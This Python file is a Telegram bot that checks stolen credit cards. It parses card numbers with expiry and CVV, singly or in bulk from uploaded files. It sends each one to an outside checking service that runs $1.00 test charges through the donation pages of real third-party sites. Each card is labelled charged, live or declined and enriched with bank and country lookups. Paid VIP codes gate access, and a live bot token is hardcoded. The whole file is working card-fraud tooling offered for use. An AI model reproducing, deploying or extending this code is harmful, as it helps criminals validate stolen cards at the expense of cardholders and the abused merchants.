import os
import re
import time
import random
import string
import asyncio
import httpx
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes
)

TOKEN = '7834120140:AAGMxi8uVLSNqCtNt9VB1lvWSkWrSMB6H3w'

# ------------------- Users -------------------

ADMINS = [6843321125]
VIP_USERS = {}
BANNED_USERS = {}
ALL_USERS = set()
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7
user_tasks = {}

# ------------------- Gates -------------------

GATES = [
    "https://raybensch.com/donations/support-ray/",
    "https://www.mgn1.org/events/"
]
gate_index = 0
api_semaphore = asyncio.Semaphore(6)

# ------------------- Codes -------------------

CODES = {}

# ------------------- BIN Lookup -------------------

async def get_bin_info(bin_number):
    urls = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://bincheck.io/api/{bin_number}"
    ]
    for _ in range(2):
        for url in urls:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    r = await client.get(url)
                    if r.status_code != 200:
                        continue
                    data = r.json()
                    brand = data.get("scheme") or data.get("brand") or "Unknown"
                    bank = (data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")) or "Unknown"
                    country = (data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")) or "Unknown"
                    return brand, bank, country
            except:
                continue
    return "Unknown", "Unknown", "Unknown"

# ------------------- Check API -------------------

async def check_card_api(card_full):
    global gate_index
    gate = GATES[gate_index]
    gate_index = (gate_index + 1) % len(GATES)

    async with api_semaphore:
        try:
            async with httpx.AsyncClient(timeout=15) as client:
                r = await client.get(
                    "http://gatescheck.duckdns.org:7000/check",
                    params={"url": gate, "card": card_full, "amount": 1.00}
                )
                result_raw = r.json().get('result', '')
                result = result_raw.lower()

                if "charge" in result or "success" in result:
                    return "approved", result_raw
                elif "insufficient" in result:
                    return "live", result_raw
                else:
                    return "declined", result_raw
        except:
            return "declined", "Error"

# ------------------- Format -------------------

async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)

    if status == "approved":
        status_text = "#Charge 🔥"
    elif status == "live":
        status_text = "#Live ✅"
    else:
        status_text = "#Declined ❌"

    return f"""#PayPal_Custom ($1.00) 🌟
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Card: {card_full}
[ϟ] Response: {response}
[ϟ] Status: {status_text}
[ϟ] Taken: {taken}s
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Info: {info}
[ϟ] Bank: {bank}
[ϟ] Country: {country}
[⌤] Dev by: . - 🍀"""

# ------------------- Permissions -------------------

def can_user_check(user_id, mode="file"):
    if user_id in ADMINS:
        return True
    elif BANNED_USERS.get(user_id):
        return False
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        return True
    else:
        return mode == "single"

# ------------------- /pp -------------------

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)

    if not can_user_check(user_id, "single"):
        return await update.message.reply_text("❌ VIP only for single check.")

    now = time.time()
    last = last_check_time.get(user_id, 0)
    if now - last < ANTI_SPAM_SECONDS:
        return await update.message.reply_text(f"❌ Wait {ANTI_SPAM_SECONDS} seconds")

    last_check_time[user_id] = now
    asyncio.create_task(process_pp(update, context))

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        return await update.message.reply_text("Usage:\n/pp 4242|09|28|123")

    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)

    text = await format_response(card_full, status, response, taken)
    await update.message.reply_text(text)

# ------------------- /stop -------------------

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stop_users[update.effective_user.id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)

    if not can_user_check(user_id, "file"):
        return await update.message.reply_text("❌ VIP only for file check.")

    if user_id in user_tasks and not user_tasks[user_id].done():
        return await update.message.reply_text("❌ Wait until current file finishes")

    task = asyncio.create_task(process_file(update, context))
    user_tasks[user_id] = task

# ------------------- process_file -------------------

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    try:
        os.makedirs("downloads", exist_ok=True)

        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        results_file_path = f"downloads/results_{file.file_id}.txt"

        approved = live = declined = 0
        panel_msg = await update.message.reply_text("Start Checking... 🔍")

        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        results = []

        # 🔥 worker لكل كارت
        async def process_line(line):
            nonlocal approved, live, declined

            if stop_users.get(user_id):
                return

            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match:
                return

            card_full = match[0]

            start_time = time.time()
            status, response = await check_card_api(card_full)
            taken = round(time.time() - start_time, 2)

            text = await format_response(card_full, status, response, taken)
            results.append(text)

            if status == "approved":
                approved += 1
                await update.message.reply_text(text)
            elif status == "live":
                live += 1
                await update.message.reply_text(text)
            else:
                declined += 1

        # 🔥 تقسيم المهام (multi-task)
        tasks = []
        for line in lines:
            if stop_users.get(user_id):
                await update.message.reply_text("Stopped ⛔")
                return

            tasks.append(asyncio.create_task(process_line(line)))

            # 🔥 كل 10 كروت ينفذهم مرة واحدة (عشان السرعة وما يعلقش)
            if len(tasks) >= 10:
                await asyncio.gather(*tasks)
                tasks = []

                panel = f"""📊 Status

✅ Charge: {approved} 💥
🟢 Live: {live} 💫
❌ Declined: {declined}
📂 Total: {approved+live+declined}
"""
                try:
                    await panel_msg.edit_text(panel)
                except:
                    pass

        # شغّل الباقي
        if tasks:
            await asyncio.gather(*tasks)

        # حفظ النتائج
        with open(results_file_path, "w", encoding="utf-8") as f:
            for r in results:
                f.write(r + "\n\n")

        await update.message.reply_text("bone")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ------------------- Admin -------------------

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return await update.message.reply_text("❌ Only admin")

    msg = "📊 All Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
        msg += f"{uid} - {status}\n"

    await update.message.reply_text(msg)

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return

    uid = int(context.args[0])
    BANNED_USERS[uid] = True
    VIP_USERS.pop(uid, None)
    await update.message.reply_text(f"{uid} banned")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return

    uid = int(context.args[0])
    BANNED_USERS.pop(uid, None)
    await update.message.reply_text(f"{uid} unbanned")

async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    uid = int(context.args[0])
    text = " ".join(context.args[1:])
    await context.bot.send_message(chat_id=uid, text=text)

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = context.args[0].upper()

    if code not in CODES:
        return await update.message.reply_text("❌ Invalid code")

    data = CODES[code]

    if data["used"] >= data["max_users"]:
        return await update.message.reply_text("❌ Limit reached")

    VIP_USERS[user_id] = int(time.time()) + data["duration"] * 86400
    data["used"] += 1

    await update.message.reply_text("✅ VIP Activated")

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return

    duration = int(context.args[0])
    max_users = int(context.args[1])

    code = "WAFA-" + "-".join(
        "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
        for _ in range(3)
    )

    CODES[code] = {
        "duration": duration,
        "max_users": max_users,
        "used": 0
    }

    await update.message.reply_text(code)

# ------------------- Run -------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ALL_USERS.add(update.effective_user.id)
    await update.message.reply_text("Bot Ready ✅")

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))

    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == "__main__":
    main()
